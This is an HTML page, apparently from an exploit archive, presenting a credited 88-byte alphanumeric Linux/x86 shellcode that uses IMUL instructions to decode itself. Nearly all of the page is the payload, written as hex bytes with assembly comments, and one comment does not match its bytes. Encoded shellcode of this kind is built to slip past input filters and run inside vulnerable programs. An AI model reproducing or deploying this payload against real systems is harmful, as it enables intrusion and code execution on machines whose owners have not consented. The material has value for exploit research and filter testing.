<html><head><title>Linux/x86 - Alpha-Numeric using IMUL Method - 88 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
     /*-----------------------------------------------------*/
     /*     Alpha-Numeric Shellcode using IMUL Method       */
     /*           By XORt@dallas_2600)              88bytes */
     /*-----------------------------------------------------*/
     &quot;\x68\x69\x58\x69\x6b&quot; /* push $0x6b695869             */
     &quot;\x68\x7a\x36\x37\x70&quot; /* push $0x7037367a             */
     &quot;\x68\x58\x58\x41\x73&quot; /* push $0x73415858             */
     &quot;\x68\x71\x4a\x77\x79&quot; /* push $0x79774a71             */
     &quot;\x68\x65\x77\x57\x31&quot; /* push $0x31577765             */
     &quot;\x68\x42\x69\x57\x77&quot; /* push $0x6850c031             */
     &quot;\x50\x50\x50\x50\x50&quot; /* 17 push %eax's               */
     &quot;\x50\x50\x50\x50\x50&quot; /*                              */
     &quot;\x50\x50\x50\x50\x50&quot; /*                              */
     &quot;\x50\x50&quot;             /*                              */
     &quot;\x54&quot;                 /* push %esp                    */
     &quot;\x59&quot;                 /* pop %ecx                     */
     &quot;\x6b\x51\x58\x57&quot;     /* imul $0x57, 0x58(%ecx), %edx */
     &quot;\x42&quot;                 /* inc %edx                     */
     &quot;\x52&quot;                 /* push %edx                    */
     &quot;\x6b\x41\x54\x78&quot;     /* imul $0x78, 0x54(%ecx), %edx */
     &quot;\x34\x63&quot;             /* xor $0x63, %al               */
     &quot;\x50&quot;                 /* push %eax                    */
     &quot;\x6b\x51\x50\x4a&quot;     /* imul $0x4a, 0x50(%ecx), %edx */
     &quot;\x4a&quot;                 /* dec %edx                     */
     &quot;\x4a&quot;                 /* dec %edx                     */
     &quot;\x52&quot;                 /* push %edx                    */
     &quot;\x6b\x51\x4c\x79&quot;     /* imul $0x79, 0x4c(%ecx), %edx */
     &quot;\x4a&quot;                 /* dec %edx                     */
     &quot;\x52&quot;                 /* push %edx                    */
     &quot;\x6b\x41\x48\x36&quot;     /* imul $0x36, 0x48(%ecx), %edx */
     &quot;\x34\x61&quot;             /* xor $0x61, %al               */
     &quot;\x50&quot;                 /* push %eax                    */
     &quot;\x6b\x51\x44\x79&quot;     /* imul $0x79, 0x44(%ecx), %edx */
     &quot;\x4a&quot;                 /* dec %edx                     */
     &quot;\x52&quot;                 /* push %edx                    */
     /*------------------------------------------[bytes:88]-*/




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
